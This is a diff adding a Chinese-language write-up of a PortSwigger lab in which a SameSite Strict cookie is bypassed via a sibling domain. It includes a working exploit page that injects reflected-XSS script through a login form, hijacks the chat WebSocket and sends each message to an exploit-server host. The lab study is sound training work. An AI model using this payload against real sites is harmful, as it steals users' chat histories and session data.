@@ -1,8 +1,10 @@
 ---
 title: Cross-site request forgery (CSRF)
 description: Cross-site request forgery (CSRF)
+# last_update:
+#   date: "2025-08-12T08:00:00+08:00"
 last_update:
-  date: "2025-08-12T08:00:00+08:00"
+  date: "2025-11-09T08:00:00+08:00"
 ---
 
 ## Lab: CSRF vulnerability with no defenses
@@ -427,14 +429,54 @@ sequenceDiagram
 
 ## Lab: SameSite Strict bypass via sibling domain
 
+<!-- last_update:
+  date: "2025-11-09T08:00:00+08:00" -->
+
 | Dimension | Description                                                                                                                              |
 | --------- | ---------------------------------------------------------------------------------------------------------------------------------------- |
 | Document  | https://portswigger.net/web-security/csrf/bypassing-samesite-restrictions#bypassing-samesite-restrictions-via-vulnerable-sibling-domains |
 | Lab       | https://portswigger.net/web-security/csrf/bypassing-samesite-restrictions/lab-samesite-strict-bypass-via-sibling-domain                  |
 
-這題需要 [WebSocket](./websocket.md) 的知識，目前我還沒深入研究，之後再來解
+- 可以跟 [Lab: Cross-site WebSocket hijacking](./websocket.md#lab-cross-site-websocket-hijacking) 做呼應
+- 這題的 Cookie: session 是 SameSite: strict
 
-<!-- todo-yusheng -->
+可以觀察到首頁載入的 `/resources/css/labsEcommerce.css`，Response Header 有設定 `access-control-allow-origin: https://cms-0abc006304661b8b80a60dd700440082.web-security-academy.net`，並且訪問 cms 後，Response Header 沒有設定 X-Frame-Options，基本上注入點就在這裡
+
+承上，訪問 cms 後，會被導到 `/login` 頁面，簡易嘗試後，發現有 Reflected XSS，username 欄位可以注入任意 HTML，因此我們在 exploit-server 構造
+
+```html
+<form
+  method="POST"
+  action="https://cms-0abc006304661b8b80a60dd700440082.web-security-academy.net/login"
+>
+  <label>Username</label>
+  <input required type="username" name="username" id="username" />
+  <label>Password</label>
+  <input required type="password" name="password" value="123" />
+  <button type="submit">Log in</button>
+</form>
+<script>
+  document.getElementById("username").value = `<script>
+const ws = new WebSocket('https://0abc006304661b8b80a60dd700440082.web-security-academy.net/chat');
+ws.addEventListener('open', () => {
+    ws.send("READY");
+});
+ws.addEventListener('message', (e) => {
+    const data = encodeURIComponent(e.data);
+    fetch('https://exploit-0a5900b004701ba580cd0c5b01580006.exploit-server.net/?message=' + data, { mode: 'no-cors' });
+});
+<\/script>`;
+  document.forms[0].submit();
+</script>
+```
+
+流程是：
+
+- victim 訪問 attacker 精心構造的 `/exploit`
+- 頁面載入後，立即轉到 cms login 頁面
+- 在 cms login 頁面執行 Reflected XSS
+- 開 WebSocket 連線到 sibling domain
+- 發送 "READY" 指令，可以取得所有 chat history
 
 ## Lab: SameSite Lax bypass via cookie refresh
 
